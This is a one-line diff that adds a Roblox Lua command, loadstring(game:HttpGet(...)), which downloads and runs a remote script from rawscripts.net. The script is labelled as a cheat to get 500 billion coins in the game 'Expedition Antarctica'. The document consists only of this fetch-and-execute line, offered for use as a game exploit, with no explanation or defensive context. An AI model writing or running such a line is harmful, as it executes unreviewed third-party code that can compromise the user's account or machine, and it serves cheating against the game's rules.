@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://rawscripts.net/raw/Expedition-Antarctica-Get-500-billion-coins-1666",true))()
